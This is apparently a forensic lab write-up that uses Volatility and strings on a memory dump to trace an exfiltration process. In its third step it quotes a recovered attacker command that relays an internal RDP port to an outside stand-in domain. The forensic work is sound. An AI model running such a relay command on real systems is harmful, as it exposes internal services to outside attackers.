# Case n°3 - Network Exfiltration Analysis

## Objective
During the forensic analysis of a memory dump, we suspect that a malicious process is being used as an exfiltration point.  
The goal is to identify the IP address and port of the internal server targeted by this malware.  
For this case, I will reuse the information from case n°2
Let's search for a “IP:PORT” format.

---

## Step 1: Suspicious Process

We start by scanning the network connections in the memory dump.

```bash
python3 vol.py -f memory.dmp windows.netscan | grep 2772
```

Example output:
```
0x1dedb4f8  TCPv4  ESTABLISHED  2772  127.0.0.1  ...  127.0.0.1  iexplore.exe  -  12080
```

This output indicates that the process may be using a local tunnel. To investigate further, we will analyze `cmd.exe`.

---

## Step 2: Inspecting cmd.exe
The `consoles` plugin in Volatility allows us to retrieve command history from the command prompt.

```bash
python3 vol.py -f memory.dmp consoles
```

Relevant output:
```
ConsoleProcess: conhost.exe Pid: 2168
AttachedProcess: cmd.exe Pid: 1616

CommandHistory:
  - tcprelay.exe
  - whoami.exe
  - cmd.exe
```

Here we can clearly see that `tcprelay.exe` has been executed, which strongly suggests data redirection.

---

## Step 3: Extracting Hardcoded Information
To confirm, we extract readable strings from the dump and search for references to the suspicious binary.

```bash
strings memory.dmp | grep -i "tcprelay"
```

Result:
```
tcprelay.exe 192.168.0.22 3389 example-domain.com 443
tcprelay.exe 192.168.0.22 3389 example-domain.com 443
tcprelay.exe 192.168.0.22 3389 example-domain.com 443
```

We now have the IP address and port used for the exfiltration.

---

## Conclusion
The malware (`tcprelay.exe`) is configured to connect to the following internal server:

```
192.168.0.22:3389
```

✅ **Case completed**
